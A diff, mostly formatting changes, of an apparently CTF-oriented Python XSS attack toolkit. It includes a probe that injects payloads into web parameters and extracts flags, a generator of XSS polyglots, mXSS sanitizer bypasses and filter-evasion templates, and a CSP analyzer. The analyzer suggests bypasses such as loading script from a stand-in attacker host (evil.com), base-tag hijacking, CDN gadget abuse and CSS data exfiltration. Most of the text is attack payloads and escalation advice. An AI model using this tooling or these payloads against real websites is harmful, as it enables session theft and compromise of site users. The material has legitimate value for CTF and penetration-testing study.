@@ -129,7 +129,9 @@ class XssProbeTool:
         """Send a request with the payload injected into the target parameter."""
         request_data = {param: payload, **extra_data}
         if method == "GET":
-            return self.session.get(url, params=request_data, headers=headers, timeout=timeout)
+            return self.session.get(
+                url, params=request_data, headers=headers, timeout=timeout
+            )
         # POST — detect JSON content type
         content_type = ""
         for k, v in headers.items():
@@ -137,10 +139,16 @@ class XssProbeTool:
                 content_type = v.lower()
                 break
         if "application/json" in content_type:
-            return self.session.post(url, json=request_data, headers=headers, timeout=timeout)
-        return self.session.post(url, data=request_data, headers=headers, timeout=timeout)
+            return self.session.post(
+                url, json=request_data, headers=headers, timeout=timeout
+            )
+        return self.session.post(
+            url, data=request_data, headers=headers, timeout=timeout
+        )
 
-    def _check_reflection(self, payload: str, body: str) -> Tuple[bool, bool, List[str]]:
+    def _check_reflection(
+        self, payload: str, body: str
+    ) -> Tuple[bool, bool, List[str]]:
         """Check for full and partial reflections.
 
         Returns (full_reflected, partial_reflected, matched_fragments).
@@ -211,7 +219,13 @@ class XssProbeTool:
         # Get baseline response
         try:
             baseline_resp = self._make_request(
-                url, method, param, "xss_baseline_test_12345", extra_data, headers, timeout
+                url,
+                method,
+                param,
+                "xss_baseline_test_12345",
+                extra_data,
+                headers,
+                timeout,
             )
             baseline_length = len(baseline_resp.text)
             baseline_status = baseline_resp.status_code
@@ -238,7 +252,9 @@ class XssProbeTool:
                     )
                     body = resp.text
 
-                    full_ref, partial_ref, fragments = self._check_reflection(payload, body)
+                    full_ref, partial_ref, fragments = self._check_reflection(
+                        payload, body
+                    )
 
                     flag = self._extract_flag(body)
                     if flag and flag not in flags_found:
@@ -246,36 +262,42 @@ class XssProbeTool:
 
                     if full_ref:
                         vulnerable_contexts.add(ctx_name)
-                        findings.append({
-                            "context": ctx_name,
-                            "payload": payload,
-                            "reflection": "FULL",
-                            "status": resp.status_code,
-                            "length": len(body),
-                            "fragments": fragments,
-                            "flag": flag,
-                        })
+                        findings.append(
+                            {
+                                "context": ctx_name,
+                                "payload": payload,
+                                "reflection": "FULL",
+                                "status": resp.status_code,
+                                "length": len(body),
+                                "fragments": fragments,
+                                "flag": flag,
+                            }
+                        )
                     elif partial_ref:
-                        findings.append({
-                            "context": ctx_name,
-                            "payload": payload,
-                            "reflection": "PARTIAL",
-                            "status": resp.status_code,
-                            "length": len(body),
-                            "fragments": fragments,
-                            "flag": flag,
-                        })
+                        findings.append(
+                            {
+                                "context": ctx_name,
+                                "payload": payload,
+                                "reflection": "PARTIAL",
+                                "status": resp.status_code,
+                                "length": len(body),
+                                "fragments": fragments,
+                                "flag": flag,
+                            }
+                        )
 
                 except requests.exceptions.Timeout:
-                    findings.append({
-                        "context": ctx_name,
-                        "payload": payload,
-                        "reflection": "TIMEOUT",
-                        "status": "TIMEOUT",
-                        "length": 0,
-                        "fragments": [],
-                        "flag": None,
-                    })
+                    findings.append(
+                        {
+                            "context": ctx_name,
+                            "payload": payload,
+                            "reflection": "TIMEOUT",
+                            "status": "TIMEOUT",
+                            "length": 0,
+                            "fragments": [],
+                            "flag": None,
+                        }
+                    )
                 except Exception:
                     pass  # silently skip individual request errors
 
@@ -318,7 +340,9 @@ class XssProbeTool:
                 lines.append(f"  Payload: {f['payload']}")
                 lines.append(f"    Status: {f['status']}, Length: {f['length']}")
                 if f["fragments"]:
-                    lines.append(f"    Dangerous fragments: {', '.join(f['fragments'])}")
+                    lines.append(
+                        f"    Dangerous fragments: {', '.join(f['fragments'])}"
+                    )
                 if f["flag"]:
                     lines.append(f"    -> FLAG: {f['flag']}")
                 lines.append("")
@@ -331,7 +355,9 @@ class XssProbeTool:
                 lines.append(f"  Payload: {f['payload']}")
                 lines.append(f"    Status: {f['status']}, Length: {f['length']}")
                 if f["fragments"]:
-                    lines.append(f"    Reflected fragments: {', '.join(f['fragments'])}")
+                    lines.append(
+                        f"    Reflected fragments: {', '.join(f['fragments'])}"
+                    )
                 lines.append("")
 
         if timeout_findings:
@@ -348,7 +374,9 @@ class XssProbeTool:
         lines.append("SUMMARY:")
         lines.append(f"  Full Reflections: {len(full_findings)}")
         lines.append(f"  Partial Reflections: {len(partial_findings)}")
-        lines.append(f"  Vulnerable Contexts: {', '.join(sorted(vulnerable_contexts)) or 'None'}")
+        lines.append(
+            f"  Vulnerable Contexts: {', '.join(sorted(vulnerable_contexts)) or 'None'}"
+        )
         lines.append(f"  Flags Found: {len(flags_found)}")
         lines.append("")
 
@@ -356,9 +384,13 @@ class XssProbeTool:
         lines.append("NEXT STEPS:")
         if full_findings:
             lines.append("  - XSS confirmed! Payloads are reflected unencoded.")
-            lines.append("  - Use xss_payload_generator with 'polyglot' for robust exploit.")
+            lines.append(
+                "  - Use xss_payload_generator with 'polyglot' for robust exploit."
+            )
             if "html" in vulnerable_contexts:
-                lines.append("  - HTML context: try <script>, <img>, <svg> based payloads.")
+                lines.append(
+                    "  - HTML context: try <script>, <img>, <svg> based payloads."
+                )
             if "attribute" in vulnerable_contexts:
                 lines.append("  - Attribute context: try event handler injection.")
             if "javascript" in vulnerable_contexts:
@@ -366,15 +398,23 @@ class XssProbeTool:
             if "url" in vulnerable_contexts:
                 lines.append("  - URL context: try javascript: and data: URI schemes.")
             if csp_header != "Not set":
-                lines.append("  - CSP header present. Use csp_analyzer to check for bypasses.")
+                lines.append(
+                    "  - CSP header present. Use csp_analyzer to check for bypasses."
+                )
         elif partial_findings:
             lines.append("  - Partial reflections detected — some filtering in place.")
-            lines.append("  - Use xss_payload_generator with 'filter_bypass' to evade filters.")
+            lines.append(
+                "  - Use xss_payload_generator with 'filter_bypass' to evade filters."
+            )
             lines.append("  - Try 'encoding_bypass' to use encoded payload variants.")
         else:
-            lines.append("  - No reflections detected. The parameter may not be reflected.")
+            lines.append(
+                "  - No reflections detected. The parameter may not be reflected."
+            )
             lines.append("  - Try other parameters or check for DOM-based XSS.")
-            lines.append("  - Use xss_payload_generator with 'dom_xss' for DOM sink payloads.")
+            lines.append(
+                "  - Use xss_payload_generator with 'dom_xss' for DOM sink payloads."
+            )
 
         return "\n".join(lines)
 
@@ -424,11 +464,11 @@ class XssPayloadGenerator:
                 "desc": "MathML namespace switching (DOMPurify < 2.0.17)",
             },
             {
-                "payload": '<math><mtext><img src onerror=alert(1)>',
+                "payload": "<math><mtext><img src onerror=alert(1)>",
                 "desc": "MathML integration point bypass",
             },
             {
-                "payload": '<svg><desc><math><mtext><img src onerror=alert(1)>',
+                "payload": "<svg><desc><math><mtext><img src onerror=alert(1)>",
                 "desc": "SVG -> MathML namespace switch",
             },
             {
@@ -448,11 +488,11 @@ class XssPayloadGenerator:
         ],
         "sanitize_html": [
             {
-                "payload": '<noscript><img src=x onerror=alert(1)></noscript>',
+                "payload": "<noscript><img src=x onerror=alert(1)></noscript>",
                 "desc": "noscript bypass (parsing differs in HTML vs XHTML mode)",
             },
             {
-                "payload": '<xmp><svg onload=alert(1)></xmp>',
+                "payload": "<xmp><svg onload=alert(1)></xmp>",
                 "desc": "Raw text element bypass",
             },
         ],
@@ -462,7 +502,7 @@ class XssPayloadGenerator:
                 "desc": "SVG foreignObject + MathML integration point",
             },
             {
-                "payload": '<math><mtext><table><mglyph><svg onload=alert(1)>',
+                "payload": "<math><mtext><table><mglyph><svg onload=alert(1)>",
                 "desc": "Table inside MathML triggers namespace mutation",
             },
             {
@@ -478,7 +518,7 @@ class XssPayloadGenerator:
             "<svg onload=FUNC>",
             "<details open ontoggle=FUNC>",
             "<marquee onstart=FUNC>",
-            "<math><mtext><table><mglyph><svg><mtext><textarea><path d=\"0\" onmouseover=FUNC>",
+            '<math><mtext><table><mglyph><svg><mtext><textarea><path d="0" onmouseover=FUNC>',
             "<table background=javascript:FUNC>",
             "<input onfocus=FUNC autofocus>",
             "<video><source onerror=FUNC>",
@@ -498,7 +538,7 @@ class XssPayloadGenerator:
             "<details open ontoggle=FUNC>",
             "<marquee onstart=FUNC>",
             "<input onfocus=FUNC autofocus>",
-            "<math><mtext><annotation-xml encoding=\"text/html\"><title><svg onload=FUNC>",
+            '<math><mtext><annotation-xml encoding="text/html"><title><svg onload=FUNC>',
         ],
         "iframe": [
             "<object data=javascript:FUNC>",
@@ -510,24 +550,49 @@ class XssPayloadGenerator:
     # -- Alternative event handlers --
     ALTERNATIVE_EVENTS: Dict[str, List[str]] = {
         "onerror": [
-            "ontoggle", "onfocusin", "onpointerover", "onanimationstart",
-            "onmouseover", "onfocus", "onload", "onstart",
+            "ontoggle",
+            "onfocusin",
+            "onpointerover",
+            "onanimationstart",
+            "onmouseover",
+            "onfocus",
+            "onload",
+            "onstart",
         ],
         "onload": [
-            "onerror", "ontoggle", "onfocusin", "onpointerover",
-            "onanimationstart", "onstart", "onfocus",
+            "onerror",
+            "ontoggle",
+            "onfocusin",
+            "onpointerover",
+            "onanimationstart",
+            "onstart",
+            "onfocus",
         ],
         "onmouseover": [
-            "onpointerover", "onfocusin", "onfocus", "ontoggle",
-            "onanimationstart", "onerror", "onload",
+            "onpointerover",
+            "onfocusin",
+            "onfocus",
+            "ontoggle",
+            "onanimationstart",
+            "onerror",
+            "onload",
         ],
         "onfocus": [
-            "onfocusin", "onpointerover", "ontoggle", "onerror",
-            "onanimationstart", "onload",
+            "onfocusin",
+            "onpointerover",
+            "ontoggle",
+            "onerror",
+            "onanimationstart",
+            "onload",
         ],
         "onclick": [
-            "onpointerdown", "onpointerup", "onmousedown", "onmouseup",
-            "ontouchstart", "ontouchend", "onfocus",
+            "onpointerdown",
+            "onpointerup",
+            "onmousedown",
+            "onmouseup",
+            "ontouchstart",
+            "ontouchend",
+            "onfocus",
         ],
     }
 
@@ -585,10 +650,10 @@ class XssPayloadGenerator:
     # -- Polyglot payloads --
     POLYGLOT_PAYLOADS: List[str] = [
         "jaVasCript:/*-/*'/*\"/**/( /* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
-        "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"-->",
+        '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"-->',
         "<svg/onload=alert(1)//",
         "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
-        "\"><img src=x onerror=alert(1)//>\">",
+        '"><img src=x onerror=alert(1)//>">',
         "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
         "-->'\"--><svg onload=alert(1)>",
         "<script>alert(1)</script>\"><script>alert(1)</script>'>",
@@ -597,37 +662,96 @@ class XssPayloadGenerator:
     # -- Event handlers organized by category --
     EVENT_HANDLERS: Dict[str, List[str]] = {
         "mouse": [
-            "onclick", "ondblclick", "onmousedown", "onmouseup",
-            "onmouseover", "onmouseout", "onmousemove", "onmouseenter",
-            "onmouseleave", "oncontextmenu",
+            "onclick",
+            "ondblclick",
+            "onmousedown",
+            "onmouseup",
+            "onmouseover",
+            "onmouseout",
+            "onmousemove",
+            "onmouseenter",
+            "onmouseleave",
+            "oncontextmenu",
         ],
         "keyboard": [
-            "onkeydown", "onkeyup", "onkeypress",
+            "onkeydown",
+            "onkeyup",
+            "onkeypress",
         ],
         "form": [
-            "onfocus", "onblur", "onchange", "oninput", "onsubmit",
-            "onreset", "onselect", "oninvalid",
+            "onfocus",
+            "onblur",
+            "onchange",
+            "oninput",
+            "onsubmit",
+            "onreset",
+            "onselect",
+            "oninvalid",
         ],
         "media": [
-            "onplay", "onpause", "onended", "onvolumechange",
-            "onloadeddata", "onloadedmetadata", "ontimeupdate",
-            "oncanplay", "onseeking", "onseeked", "onwaiting",
-            "onstalled", "onsuspend", "onemptied", "onratechange",
+            "onplay",
+            "onpause",
+            "onended",
+            "onvolumechange",
+            "onloadeddata",
+            "onloadedmetadata",
+            "ontimeupdate",
+            "oncanplay",
+            "onseeking",
+            "onseeked",
+            "onwaiting",
+            "onstalled",
+            "onsuspend",
+            "onemptied",
+            "onratechange",
             "ondurationchange",
         ],
         "misc": [
-            "onload", "onerror", "onresize", "onscroll", "onunload",
-            "onbeforeunload", "onhashchange", "onpopstate",
-            "onstorage", "onoffline", "ononline", "onmessage",
-            "onanimationstart", "onanimationend", "onanimationiteration",
-            "ontransitionend", "ontoggle", "onfocusin", "onfocusout",
-            "onpointerover", "onpointerout", "onpointerenter",
-            "onpointerleave", "onpointerdown", "onpointerup",
-            "onpointermove", "ongotpointercapture", "onlostpointercapture",
-            "ontouchstart", "ontouchend", "ontouchmove", "ontouchcancel",
-            "onwheel", "onbeforeinput", "ondrag", "ondragstart",
-            "ondragend", "ondragover", "ondragenter", "ondragleave",
-            "ondrop", "onpaste", "oncopy", "oncut", "onstart",
+            "onload",
+            "onerror",
+            "onresize",
+            "onscroll",
+            "onunload",
+            "onbeforeunload",
+            "onhashchange",
+            "onpopstate",
+            "onstorage",
+            "onoffline",
+            "ononline",
+            "onmessage",
+            "onanimationstart",
+            "onanimationend",
+            "onanimationiteration",
+            "ontransitionend",
+            "ontoggle",
+            "onfocusin",
+            "onfocusout",
+            "onpointerover",
+            "onpointerout",
+            "onpointerenter",
+            "onpointerleave",
+            "onpointerdown",
+            "onpointerup",
+            "onpointermove",
+            "ongotpointercapture",
+            "onlostpointercapture",
+            "ontouchstart",
+            "ontouchend",
+            "ontouchmove",
+            "ontouchcancel",
+            "onwheel",
+            "onbeforeinput",
+            "ondrag",
+            "ondragstart",
+            "ondragend",
+            "ondragover",
+            "ondragenter",
+            "ondragleave",
+            "ondrop",
+            "onpaste",
+            "oncopy",
+            "oncut",
+            "onstart",
         ],
     }
 
@@ -657,7 +781,9 @@ class XssPayloadGenerator:
 
         try:
             if operation == "filter_bypass":
-                return self._filter_bypass(blocked_tags, blocked_events, blocked_keywords, context)
+                return self._filter_bypass(
+                    blocked_tags, blocked_events, blocked_keywords, context
+                )
             elif operation == "dom_xss":
                 return self._dom_xss()
             elif operation == "polyglot":
@@ -795,7 +921,9 @@ class XssPayloadGenerator:
             lines.append("")
 
         lines.append("TIPS:")
-        lines.append("  1. Check for sources: location.hash, location.search, document.referrer")
+        lines.append(
+            "  1. Check for sources: location.hash, location.search, document.referrer"
+        )
         lines.append("  2. Check for sinks: innerHTML, document.write, eval, $.html()")
         lines.append("  3. Use browser DevTools to trace data flow from source to sink")
         lines.append("  4. URL fragment (#) payloads bypass server-side filtering")
@@ -819,8 +947,12 @@ class XssPayloadGenerator:
 
         lines.append("USAGE:")
         lines.append("  1. Try each polyglot as-is in the target parameter")
-        lines.append("  2. These break out of multiple contexts (HTML, attribute, script, comment)")
-        lines.append("  3. If partially reflected, use the reflected portion as a starting point")
+        lines.append(
+            "  2. These break out of multiple contexts (HTML, attribute, script, comment)"
+        )
+        lines.append(
+            "  3. If partially reflected, use the reflected portion as a starting point"
+        )
 
         return "\n".join(lines)
 
@@ -862,6 +994,7 @@ class XssPayloadGenerator:
         lines.append("")
         lines.append("=== URL Encoding ===")
         import urllib.parse
+
         for bp in base_payloads:
             encoded = urllib.parse.quote(bp, safe="")
             lines.append(f"  {encoded}")
@@ -934,7 +1067,6 @@ class XssPayloadGenerator:
 
         return "\n".join(lines)
 
-
     def _mxss(self, sanitizer: str = "all") -> str:
         """Generate mXSS (Mutation XSS) payloads for sanitizer bypass."""
         lines = [
@@ -966,8 +1098,12 @@ class XssPayloadGenerator:
 
         lines.append("TIPS:")
         lines.append("  1. mXSS relies on DOM mutation — test in a real browser")
-        lines.append("  2. The key insight: sanitizer parses HTML one way, browser re-parses differently")
-        lines.append("  3. MathML <annotation-xml encoding='text/html'> is an HTML integration point")
+        lines.append(
+            "  2. The key insight: sanitizer parses HTML one way, browser re-parses differently"
+        )
+        lines.append(
+            "  3. MathML <annotation-xml encoding='text/html'> is an HTML integration point"
+        )
         lines.append("  4. SVG <foreignObject> is another HTML integration point")
         lines.append("  5. Table elements inside MathML trigger namespace confusion")
 
@@ -1026,7 +1162,9 @@ class CspAnalyzerTool:
                 directives[name] = values
         return directives
 
-    def _analyze_directives(self, directives: Dict[str, List[str]]) -> Tuple[List[Dict], List[str]]:
+    def _analyze_directives(
+        self, directives: Dict[str, List[str]]
+    ) -> Tuple[List[Dict], List[str]]:
         """Analyze directives and return (weaknesses, bypass_suggestions)."""
         weaknesses: List[Dict] = []
         bypasses: List[str] = []
@@ -1039,114 +1177,150 @@ class CspAnalyzerTool:
 
         # --- Check unsafe-inline in script-src ---
         if "'unsafe-inline'" in script_src:
-            weaknesses.append({
-                "directive": "script-src",
-                "issue": "'unsafe-inline' allows inline script execution",
-                "severity": "HIGH",
-            })
+            weaknesses.append(
+                {
+                    "directive": "script-src",
+                    "issue": "'unsafe-inline' allows inline script execution",
+                    "severity": "HIGH",
+                }
+            )
             bypasses.append("Inline <script>alert(1)</script> should execute directly.")
             bypasses.append("Inline event handlers like onerror=alert(1) should work.")
 
         # --- Check unsafe-eval in script-src ---
         if "'unsafe-eval'" in script_src:
-            weaknesses.append({
-                "directive": "script-src",
-                "issue": "'unsafe-eval' allows eval(), Function(), setTimeout(string)",
-                "severity": "HIGH",
-            })
+            weaknesses.append(
+                {
+                    "directive": "script-src",
+                    "issue": "'unsafe-eval' allows eval(), Function(), setTimeout(string)",
+                    "severity": "HIGH",
+                }
+            )
             bypasses.append("Use eval('alert(1)') or new Function('alert(1)')()")
 
         # --- Wildcard * ---
         if "*" in script_src:
-            weaknesses.append({
-                "directive": "script-src",
-                "issue": "Wildcard (*) allows loading scripts from any origin",
-                "severity": "HIGH",
-            })
-            bypasses.append("Host a script on any domain: <script src='https://evil.com/xss.js'></script>")
+            weaknesses.append(
+                {
+                    "directive": "script-src",
+                    "issue": "Wildcard (*) allows loading scripts from any origin",
+                    "severity": "HIGH",
+                }
+            )
+            bypasses.append(
+                "Host a script on any domain: <script src='https://evil.com/xss.js'></script>"
+            )
 
         for directive_name, values in directives.items():
             if directive_name != "script-src" and "*" in values:
-                weaknesses.append({
-                    "directive": directive_name,
-                    "issue": f"Wildcard (*) in {directive_name} allows loading from any origin",
-                    "severity": "MEDIUM",
-                })
+                weaknesses.append(
+                    {
+                        "directive": directive_name,
+                        "issue": f"Wildcard (*) in {directive_name} allows loading from any origin",
+                        "severity": "MEDIUM",
+                    }
+                )
 
         # --- data: in script-src ---
         if "data:" in script_src:
-            weaknesses.append({
-                "directive": "script-src",
-                "issue": "'data:' URI scheme allows inline script via data: URIs",
-                "severity": "HIGH",
-            })
+            weaknesses.append(
+                {
+                    "directive": "script-src",
+                    "issue": "'data:' URI scheme allows inline script via data: URIs",
+                    "severity": "HIGH",
+                }
+            )
             bypasses.append("Use <script src='data:text/javascript,alert(1)'></script>")
 
         # --- Missing base-uri ---
         if "base-uri" not in directives:
-            weaknesses.append({
-                "directive": "base-uri",
-                "issue": "Missing base-uri directive allows <base> tag injection",
-                "severity": "MEDIUM",
-            })
-            bypasses.append("Inject <base href='https://evil.com/'> to hijack relative script URLs.")
+            weaknesses.append(
+                {
+                    "directive": "base-uri",
+                    "issue": "Missing base-uri directive allows <base> tag injection",
+                    "severity": "MEDIUM",
+                }
+            )
+            bypasses.append(
+                "Inject <base href='https://evil.com/'> to hijack relative script URLs."
+            )
 
         # --- Missing object-src ---
         if "object-src" not in directives:
-            weaknesses.append({
-                "directive": "object-src",
-                "issue": "Missing object-src allows plugin-based XSS (Flash, Java applets)",
-                "severity": "MEDIUM",
-            })
-            bypasses.append("Try <object data='data:text/html,...'> or Flash-based XSS.")
+            weaknesses.append(
+                {
+                    "directive": "object-src",
+                    "issue": "Missing object-src allows plugin-based XSS (Flash, Java applets)",
+                    "severity": "MEDIUM",
+                }
+            )
+            bypasses.append(
+                "Try <object data='data:text/html,...'> or Flash-based XSS."
+            )
 
         # --- Missing frame-ancestors ---
         if "frame-ancestors" not in directives:
-            weaknesses.append({
-                "directive": "frame-ancestors",
-                "issue": "Missing frame-ancestors allows clickjacking",
-                "severity": "MEDIUM",
-            })
+            weaknesses.append(
+                {
+                    "directive": "frame-ancestors",
+                    "issue": "Missing frame-ancestors allows clickjacking",
+                    "severity": "MEDIUM",
+                }
+            )
             bypasses.append("Page can be framed — clickjacking attack possible.")
 
         # --- strict-dynamic with nonce ---
         has_nonce = any(v.startswith("'nonce-") for v in script_src)
         if "'strict-dynamic'" in script_src:
-            weaknesses.append({
-                "directive": "script-src",
-                "issue": "'strict-dynamic' trusts scripts loaded by trusted scripts",
-                "severity": "MEDIUM",
-            })
-            bypasses.append("If you can inject into a nonced script, dynamically added scripts will execute.")
+            weaknesses.append(
+                {
+                    "directive": "script-src",
+                    "issue": "'strict-dynamic' trusts scripts loaded by trusted scripts",
+                    "severity": "MEDIUM",
+                }
+            )
+            bypasses.append(
+                "If you can inject into a nonced script, dynamically added scripts will execute."
+            )
             bypasses.append("Look for script gadgets in loaded libraries.")
 
         # --- Nonce present ---
         if has_nonce:
-            weaknesses.append({
-                "directive": "script-src",
-                "issue": "Nonce-based policy — check for nonce reuse or leaking in responses",
-                "severity": "LOW",
-            })
-            bypasses.append("Check if the nonce value is static (reused across requests).")
-            bypasses.append("Check if the nonce appears in the page source (can be extracted).")
+            weaknesses.append(
+                {
+                    "directive": "script-src",
+                    "issue": "Nonce-based policy — check for nonce reuse or leaking in responses",
+                    "severity": "LOW",
+                }
+            )
+            bypasses.append(
+                "Check if the nonce value is static (reused across requests)."
+            )
+            bypasses.append(
+                "Check if the nonce appears in the page source (can be extracted)."
+            )
 
         # --- https: only in script-src ---
         if "https:" in script_src and "'unsafe-inline'" not in script_src:
-            weaknesses.append({
-                "directive": "script-src",
-                "issue": "'https:' allows loading scripts from any HTTPS origin",
-                "severity": "MEDIUM",
-            })
+            weaknesses.append(
+                {
+                    "directive": "script-src",
+                    "issue": "'https:' allows loading scripts from any HTTPS origin",
+                    "severity": "MEDIUM",
+                }
+            )
             bypasses.append("Host a script on any HTTPS domain to bypass.")
 
         # --- Known bypass CDNs ---
         for cdn in self.BYPASS_CDNS:
             if cdn in all_values_flat:
-                weaknesses.append({
-                    "directive": "script-src",
-                    "issue": f"Known bypass CDN allowed: {cdn}",
-                    "severity": "HIGH",
-                })
+                weaknesses.append(
+                    {
+                        "directive": "script-src",
+                        "issue": f"Known bypass CDN allowed: {cdn}",
+                        "severity": "HIGH",
+                    }
+                )
                 if "cdnjs.cloudflare.com" == cdn:
                     bypasses.append(
                         f"Use Angular on {cdn}: "
@@ -1155,7 +1329,7 @@ class CspAnalyzerTool:
                     )
                 elif "cdn.jsdelivr.net" == cdn:
                     bypasses.append(
-                        f"Use jsdelivr to proxy any GitHub repo: "
+                        "Use jsdelivr to proxy any GitHub repo: "
                         "https://cdn.jsdelivr.net/gh/user/repo@version/file.js"
                     )
                 elif "ajax.googleapis.com" == cdn:
@@ -1206,20 +1380,26 @@ class CspAnalyzerTool:
 
         # --- report-uri / report-to ---
         if "report-uri" in directives or "report-to" in directives:
-            weaknesses.append({
-                "directive": "report-uri/report-to",
-                "issue": "CSP reporting configured — violations are logged but may still be enforced",
-                "severity": "LOW",
-            })
+            weaknesses.append(
+                {
+                    "directive": "report-uri/report-to",
+                    "issue": "CSP reporting configured — violations are logged but may still be enforced",
+                    "severity": "LOW",
+                }
+            )
 
         # --- unsafe-inline in style-src ---
         if "'unsafe-inline'" in style_src:
-            weaknesses.append({
-                "directive": "style-src",
-                "issue": "'unsafe-inline' in style-src allows CSS injection",
-                "severity": "LOW",
-            })
-            bypasses.append("CSS injection possible — use for data exfiltration via background-image URLs.")
+            weaknesses.append(
+                {
+                    "directive": "style-src",
+                    "issue": "'unsafe-inline' in style-src allows CSS injection",
+                    "severity": "LOW",
+                }
+            )
+            bypasses.append(
+                "CSS injection possible — use for data exfiltration via background-image URLs."
+            )
 
         return weaknesses, bypasses
 
@@ -1266,7 +1446,9 @@ class CspAnalyzerTool:
             try:
                 resp = self.session.get(url, timeout=timeout)
                 csp_string = resp.headers.get("Content-Security-Policy", "")
-                report_only_csp = resp.headers.get("Content-Security-Policy-Report-Only", "")
+                report_only_csp = resp.headers.get(
+                    "Content-Security-Policy-Report-Only", ""
+                )
             except Exception as exc:
                 return f"[CspAnalyzerTool] Error fetching URL: {exc}"
         else:
@@ -1305,7 +1487,9 @@ class CspAnalyzerTool:
             lines.append("")
             csp_string = report_only_csp
         elif report_only_csp:
-            lines.append("NOTE: Content-Security-Policy-Report-Only header also present.")
+            lines.append(
+                "NOTE: Content-Security-Policy-Report-Only header also present."
+            )
             lines.append("")
 
         # Raw CSP
